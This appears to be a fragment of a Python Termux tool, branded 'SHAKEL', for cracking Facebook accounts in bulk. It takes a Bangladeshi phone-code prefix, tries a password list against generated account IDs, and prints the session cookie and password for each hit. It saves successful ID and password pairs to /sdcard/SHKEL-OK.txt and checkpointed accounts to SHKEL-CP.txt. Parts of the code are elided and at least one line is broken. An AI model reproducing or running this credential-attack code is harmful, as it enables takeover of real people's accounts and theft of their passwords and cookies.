...
logo = (""""\033[132m  ____  _   _    _    _  _______ _     
 / ___|| | | |  / \  | |/ / ____| |    
 \___ \| |_| | / _ \ | ' /|  _| | |    
  ___) |  _  |/ ___ \| . \| |___| |___ 
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/shakelbhai132')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def i():
    ...
    jalan('\033[1;32m ══════════════════════════════════════════════════════════')
    jalan('\033[1;36m  BD CODES    :  \033[1;33m016, \033[1;33m017 ,\033[1;33m018 ,\033[1;33m019  ...\033[0;97m')
    jalan('\033[1;32m ══════════════════════════════════════════════════════════\n')
    code = input(' PUT CODE : ')
    print("")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[SHKEL-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHKEL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[SHKEL-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHKEL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[SHKEL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
